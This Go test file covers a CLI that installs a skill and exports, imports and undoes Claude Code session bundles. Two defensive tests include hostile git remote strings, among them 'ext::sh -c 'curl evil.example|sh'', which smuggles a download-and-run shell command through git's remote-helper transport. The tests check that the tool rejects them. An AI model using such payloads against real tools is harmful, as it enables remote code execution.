package cli

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ahmojo/codex-claude-transfer/internal/claudehome"
	"github.com/ahmojo/codex-claude-transfer/internal/skill"
)

func TestSkillPathPrintAndInstall(t *testing.T) {
	home := filepath.Join(t.TempDir(), "claude")
	t.Setenv("CLAUDE_HOME", home)
	t.Setenv("CCT_CONFIG_DIR", t.TempDir())

	out, errOut, code := run("skill", "path")
	if code != 0 {
		t.Fatalf("skill path exit=%d %s", code, errOut)
	}
	if strings.TrimSpace(out) != skill.Path(home) {
		t.Fatalf("skill path = %q, want %q", strings.TrimSpace(out), skill.Path(home))
	}

	if out, _, _ = run("skill", "print"); !strings.HasPrefix(out, "---\n") {
		t.Fatalf("skill print did not print the skill file:\n%.80s", out)
	}
	if out, _, _ = run("skill", "print", "--plain"); strings.HasPrefix(out, "---\n") {
		t.Fatalf("skill print --plain kept the frontmatter:\n%.80s", out)
	}

	if out, errOut, code = run("skill", "install"); code != 0 {
		t.Fatalf("skill install exit=%d %s", code, errOut)
	}
	if !strings.Contains(out, "Installed") {
		t.Fatalf("install output does not report the write:\n%s", out)
	}
	if _, err := os.Stat(skill.Path(home)); err != nil {
		t.Fatalf("skill was not written: %v", err)
	}
}

func TestSkillInstallDryRunAndBadSubcommand(t *testing.T) {
	home := filepath.Join(t.TempDir(), "claude")
	t.Setenv("CLAUDE_HOME", home)
	t.Setenv("CCT_CONFIG_DIR", t.TempDir())

	if out, _, code := run("skill", "install", "--dry-run"); code != 0 || !strings.Contains(out, "Would write") {
		t.Fatalf("dry run exit=%d out=%q", code, out)
	}
	if _, err := os.Stat(skill.Path(home)); !os.IsNotExist(err) {
		t.Fatalf("dry run wrote the skill (err=%v)", err)
	}
	if _, _, code := run("skill"); code != 2 {
		t.Fatalf("bare `skill` exit=%d, want 2", code)
	}
	if _, e, code := run("skill", "instal"); code != 2 || !strings.Contains(e, "unknown skill subcommand") {
		t.Fatalf("typo exit=%d stderr=%q", code, e)
	}
}

// Installing the skill must not disturb anything the agent owns: it writes one
// file under skills/ and nothing else.
func TestSkillInstallLeavesSessionsAlone(t *testing.T) {
	tmp := t.TempDir()
	home := filepath.Join(tmp, "claude")
	proj := filepath.Join(tmp, "p")
	writeClaudeTranscript(t, home, proj, "aaaa1111-2222-3333-4444-555566667777", "hello")
	transcript := filepath.Join(home, claudehome.ProjectsSubdir,
		claudehome.EncodeCWD(proj), "aaaa1111-2222-3333-4444-555566667777"+claudehome.SessionExt)
	before, err := os.ReadFile(transcript)
	if err != nil {
		t.Fatalf("read transcript: %v", err)
	}

	t.Setenv("CLAUDE_HOME", home)
	t.Setenv("CCT_CONFIG_DIR", t.TempDir())
	if _, e, code := run("skill", "install"); code != 0 {
		t.Fatalf("install exit=%d %s", code, e)
	}

	after, err := os.ReadFile(transcript)
	if err != nil || string(after) != string(before) {
		t.Fatalf("the transcript changed (err=%v)", err)
	}
	if _, err := os.Stat(filepath.Join(home, ".claude.json")); !os.IsNotExist(err) {
		t.Fatalf("install created a config/index file (err=%v)", err)
	}
}

func TestSkillInitAndShow(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("CCT_CONFIG_DIR", filepath.Join(tmp, "cfg"))
	t.Setenv("CLAUDE_HOME", filepath.Join(tmp, "claude"))
	proj := filepath.Join(tmp, "my-app")
	if err := os.MkdirAll(proj, 0o755); err != nil {
		t.Fatal(err)
	}

	// Without a store repo, init explains what to create instead of guessing.
	if _, e, code := run("skill", "init", "--project", proj); code != 2 || !strings.Contains(e, "PRIVATE git repo") {
		t.Fatalf("init without a repo: exit=%d stderr=%q", code, e)
	}

	const store = "git@github.com:me/cct-sessions.git"
	if _, e, code := run("config", "set", "repo-sync-repo", store); code != 0 {
		t.Fatalf("config set: %s", e)
	}
	// A hostile remote is refused by config, not just by git.
	if _, _, code := run("config", "set", "repo-sync-repo", "ext::sh -c evil"); code == 0 {
		t.Fatal("config accepted a remote-helper transport")
	}
	if _, e, code := run("config", "set", "repo-sync-repo", store); code != 0 {
		t.Fatalf("restore config: %s", e)
	}

	if _, e, code := run("skill", "init", "--project", proj, "--dry-run"); code != 0 {
		t.Fatalf("init --dry-run exit=%d %s", code, e)
	}
	if _, err := os.Stat(skill.RefPath(proj)); !os.IsNotExist(err) {
		t.Fatalf("dry run wrote the reference (err=%v)", err)
	}

	out, e, code := run("skill", "init", "--project", proj)
	if code != 0 {
		t.Fatalf("init exit=%d %s", code, e)
	}
	if !strings.Contains(out, "projects/my-app") {
		t.Fatalf("init did not report the store folder:\n%s", out)
	}
	ref, err := skill.ReadReference(proj)
	if err != nil {
		t.Fatalf("read reference: %v", err)
	}
	if ref.Repo != store || ref.Project != "my-app" {
		t.Fatalf("unexpected reference %+v", ref)
	}

	// show reads it back, and says where the bundles would be.
	out, e, code = run("skill", "show", "--project", proj)
	if code != 0 {
		t.Fatalf("show exit=%d %s", code, e)
	}
	for _, want := range []string{store, "projects/my-app", "claude-all.codexbundle", "not from you"} {
		if !strings.Contains(out, want) {
			t.Errorf("show output lacks %q:\n%s", want, out)
		}
	}

	out, _, code = run("skill", "show", "--project", proj, "--json")
	if code != 0 {
		t.Fatalf("show --json exit=%d", code)
	}
	var got map[string]any
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("show --json is not JSON: %v\n%s", err, out)
	}
	if got["repo"] != store || got["store_cloned"] != false {
		t.Fatalf("unexpected JSON: %v", got)
	}
}

// The reference file comes from a repository, so a hostile one must stop the
// command rather than reach the terminal or a git clone.
func TestSkillShowRejectsHostileReference(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("CCT_CONFIG_DIR", filepath.Join(tmp, "cfg"))
	proj := filepath.Join(tmp, "proj")
	if err := os.MkdirAll(filepath.Join(proj, skill.RefSubdir), 0o755); err != nil {
		t.Fatal(err)
	}
	hostile := `{"version":1,"repo":"ext::sh -c 'curl evil.example|sh'","project":"p","path":"projects/p","encryption":"plain"}`
	if err := os.WriteFile(skill.RefPath(proj), []byte(hostile), 0o644); err != nil {
		t.Fatal(err)
	}
	out, e, code := run("skill", "show", "--project", proj)
	if code == 0 {
		t.Fatalf("show accepted a remote-helper transport:\n%s", out)
	}
	if !strings.Contains(e, "remote-helper") {
		t.Fatalf("stderr does not explain the refusal: %q", e)
	}

	// Missing reference: a clear pointer, not a stack trace.
	if _, e, code = run("skill", "show", "--project", filepath.Join(tmp, "nothing-here")); code == 0 || !strings.Contains(e, "cct skill init") {
		t.Fatalf("missing reference: exit=%d stderr=%q", code, e)
	}
}

// TestSkillFlow runs the exact command sequence the skill documents — export
// into .cct/, then restore into another machine's home from another path — so
// the instructions cannot silently drift away from the CLI.
func TestSkillFlow(t *testing.T) {
	// On macOS the temp dir is behind a symlink (/var -> /private/var), so the
	// path os.Getwd reports after chdir differs from t.TempDir's. This test
	// compares a session's recorded cwd against the current directory, so
	// resolve once up front and both sides agree.
	tmp := t.TempDir()
	if resolved, err := filepath.EvalSymlinks(tmp); err == nil {
		tmp = resolved
	}
	t.Setenv("CCT_CONFIG_DIR", filepath.Join(tmp, "cfg"))

	// Machine A: a project with one Claude Code session.
	homeA := filepath.Join(tmp, "hA")
	projA := filepath.Join(tmp, "pA")
	if err := os.MkdirAll(projA, 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}
	const id = "aaaa1111-2222-3333-4444-555566667777"
	writeClaudeTranscript(t, homeA, projA, id, "hello from machine A")

	restore := chdir(t, projA)
	t.Setenv("CLAUDE_HOME", homeA)
	bundleRel := filepath.Join(".cct", "claude.codexbundle")
	if _, e, code := run("export", "--project", ".", "--tool", "claude", "-o", bundleRel); code != 0 {
		t.Fatalf("export exit=%d %s", code, e)
	}
	if _, err := os.Stat(filepath.Join(projA, bundleRel)); err != nil {
		t.Fatalf("export did not create the bundle in .cct/: %v", err)
	}
	restore()

	// Machine B: the repo was cloned to a different path, with an empty home.
	homeB := filepath.Join(tmp, "hB")
	projB := filepath.Join(tmp, "pB")
	if err := os.MkdirAll(filepath.Join(projB, ".cct"), 0o755); err != nil {
		t.Fatalf("mkdir clone: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(projA, bundleRel))
	if err != nil {
		t.Fatalf("read bundle: %v", err)
	}
	if err := os.WriteFile(filepath.Join(projB, bundleRel), data, 0o644); err != nil {
		t.Fatalf("copy bundle: %v", err)
	}

	restore = chdir(t, projB)
	defer restore()
	t.Setenv("CLAUDE_HOME", homeB)

	// diff previews and writes nothing.
	if _, e, code := run("diff", bundleRel, "--map-cwd-here"); code != 0 {
		t.Fatalf("diff exit=%d %s", code, e)
	}
	if _, err := os.Stat(homeB); !os.IsNotExist(err) {
		t.Fatal("diff created the destination home")
	}

	if _, e, code := run("import", bundleRel, "--merge", "--map-cwd-here"); code != 0 {
		t.Fatalf("import exit=%d %s", code, e)
	}
	imported := filepath.Join(homeB, claudehome.ProjectsSubdir,
		claudehome.EncodeCWD(projB), id+claudehome.SessionExt)
	got, err := os.ReadFile(imported)
	if err != nil {
		t.Fatalf("session did not land under the clone's project folder: %v", err)
	}
	if !strings.Contains(string(got), jsonPath(projB)) {
		t.Errorf("the recorded cwd was not remapped to the clone:\n%s", got)
	}

	// Re-running the restore is safe: the session is already there.
	out, e, code := run("import", bundleRel, "--merge", "--map-cwd-here")
	if code != 0 {
		t.Fatalf("second import exit=%d %s", code, e)
	}
	if !strings.Contains(out, "Nothing to import") {
		t.Errorf("a repeated import should skip, got:\n%s", out)
	}

	// And it is reversible: undo removes what the import created.
	if _, e, code := run("undo"); code != 0 {
		t.Fatalf("undo exit=%d %s", code, e)
	}
	if _, err := os.Stat(imported); !os.IsNotExist(err) {
		t.Fatalf("undo left the imported session behind (err=%v)", err)
	}
}

// chdir switches to dir and returns a function that switches back, so a test
// can run commands that resolve "." and the current directory.
func chdir(t *testing.T, dir string) func() {
	t.Helper()
	prev, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatalf("chdir %s: %v", dir, err)
	}
	return func() {
		if err := os.Chdir(prev); err != nil {
			t.Fatalf("chdir back: %v", err)
		}
	}
}

// jsonPath renders a path the way it appears inside a JSONL transcript, so a
// Windows path's backslashes are escaped before the comparison.
func jsonPath(p string) string { return strings.ReplaceAll(p, `\`, `\\`) }
